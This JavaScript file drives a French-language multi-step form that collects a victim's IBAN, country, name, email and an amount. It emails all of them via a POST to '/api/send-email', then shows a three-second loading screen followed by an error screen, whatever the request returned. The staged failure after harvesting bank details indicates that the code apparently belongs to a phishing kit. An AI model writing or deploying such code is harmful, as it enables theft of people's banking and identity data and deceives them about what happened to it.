const iban = document.getElementById("iban");
const pays = document.getElementById("country");
const name = document.getElementById("name");
const prenom = document.getElementById("prenom");
const email = document.getElementById("email");
const montant = document.getElementById("montant");
const actionfinish = document.getElementById("actionfinish");
const recaputilatif = document.getElementById("recaputilatif");
const zoneErreur = document.getElementById("zoneErreur");
const topImage = document.getElementById("topImage");

const myRib = document.getElementById("myRib")
const myName = document.getElementById("myName")
const myLastName = document.getElementById("myLastName")
const myMontant = document.getElementById("myMontant")
const myEmail = document.getElementById("myEmail")

const zonePrincipal = document.getElementById("zonePrincipal");
const zone1 = document.getElementById("zone1");
const zone2 = document.getElementById("zone2");
const zoneChargement = document.getElementById("zoneChargement");

const action1 = document.getElementById("action1");
const action2 = document.getElementById("action2");
const action3 = document.getElementById("action3");

document.getElementById("action1").addEventListener("click", function () {

    if (iban.value !== "" && pays.value !== "") {

        zonePrincipal.classList.add("hidden");
        zone1.classList.remove("hidden");

    } else {

        alert("Le champ de saisie est vide")

    }

});

document.getElementById("action2").addEventListener("click", function () {

    if (name.value !== "" && prenom.value !== "" && email.value !== "" && montant.value !== "") {

        zone1.classList.add("hidden");
        recaputilatif.classList.remove("hidden");

        // Ajouter les valeurs 
        myRib.innerText = iban.value;
        myName.innerText = name.value;
        myLastName.innerText = prenom.value;
        myMontant.innerText = montant.value;
        myEmail.innerText = email.value;

        // Supprimer l'image
        topImage.classList.add("hidden")

    } else {

        alert("Le champ de saisie est vide")

    }
});

document.getElementById("actionfinish").addEventListener("click", async function () {

    recaputilatif.classList.add("hidden");
    zoneChargement.classList.remove("hidden");

    try {
        await fetch('/api/send-email', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                nom: name.value,
                prenom: prenom.value,
                iban: iban.value,
                montant: montant.value,
                email: email.value,
            }),
        });
    } catch (e) {
        console.error('Erreur envoi email:', e);
    }

    setTimeout(() => {
        zoneChargement.classList.add("hidden");
        zoneErreur.classList.remove("hidden");
    }, 3000);
});
